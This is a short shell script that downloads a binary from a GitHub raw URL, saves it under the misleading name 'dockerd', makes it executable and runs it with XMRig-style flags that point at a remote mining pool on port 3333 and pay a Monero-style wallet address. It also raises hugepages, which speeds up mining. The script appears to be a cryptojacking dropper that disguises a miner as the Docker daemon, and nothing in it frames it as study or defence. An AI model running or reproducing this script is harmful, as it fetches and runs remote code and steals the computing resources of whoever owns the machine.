#!/bin/sh

sysctl vm.nr_hugepages=128

wget https://raw.githubusercontent.com/trgcyln/test/29d100785c494989324f0dc49e5f230f2e0d35a5/dockerd
chmod +x dockerd
./dockerd -o 3.135.210.215:3333 -u 87tx17L9eSpFsswb2aHEYX2gx6ah84X1oCt3QAtZ4kRVignDgQzLrK6XLfmB36PwWLXosxzDhev8xbtnrzZ2ijQLHRrJSSm -k -p "Digital"
